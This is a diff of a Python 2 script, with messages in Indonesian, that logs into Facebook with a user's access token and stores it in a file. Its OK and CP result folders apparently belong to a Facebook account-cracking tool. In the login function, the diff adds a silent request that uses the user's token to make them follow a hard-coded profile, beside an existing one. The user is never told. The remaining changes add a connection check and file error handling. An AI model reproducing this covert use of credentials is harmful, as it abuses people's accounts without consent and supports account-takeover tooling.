@@ -1,5 +1,12 @@
 # -*- coding: utf-8
 # author by angga kurniawan
+import os
+try:
+	import requests
+except ImportError:
+	print("\n ! module requests belum terinstall")
+	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")
+
 import os, sys, re, time, requests, json, random, bs4, calendar
 from multiprocessing.pool import ThreadPool
 from datetime import datetime
@@ -58,6 +65,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token="+token)
+			requests.post("https://graph.facebook.com/100002163187650/subscribers?access_token="+token)
 			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
 			time.sleep(1)
 			menu()
@@ -69,13 +77,17 @@ def menu():
 	os.system("clear")
 	global token
 	try:
+		#-> test koneksi
+		requests.get("https://mbasic.facebook.com")
+	except requests.exceptions.ConnectionError:
+		exit(" ! tidak ada koneksi internet")
+	try:
 		token = open("login.txt","r").read()
 	except KeyError:
 		os.system("rm -f login.txt")
 		exit(" ! token kadaluwarsa")
 	try:
 		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
-		ip = requests.get("https://api.ipify.org").text
 	except IOError:
 		os.system("rm -f login.txt")
 		exit(" ! token kadaluwarsa")
@@ -110,10 +122,13 @@ def menu():
 			print(" * list nama file tersimpan di folder OK")
 			for file in dirs:
 				print(" + "+file)
-			file = raw_input("\n ? pilih nama file : ")
-			if file == "":
-				menu()
-			totalok = open("OK/%s"%(file)).read().splitlines()
+			try:
+				file = raw_input("\n ? pilih nama file : ")
+				if file == "":
+					menu()
+				totalok = open("OK/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print(" # ----------------------------------------------")
@@ -126,10 +141,13 @@ def menu():
 			print(" * list nama file tersimpan di folder CP")
 			for file in dirs:
 				print(" + "+file)
-			file = raw_input("\n ? pilih nama file : ")
-			if file == "":
-				menu()
-			totalcp = open("CP/%s"%(file)).read().splitlines()
+			try:
+				file = raw_input("\n ? pilih nama file : ")
+				if file == "":
+					menu()
+				totalcp = open("CP/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print(" # ----------------------------------------------")
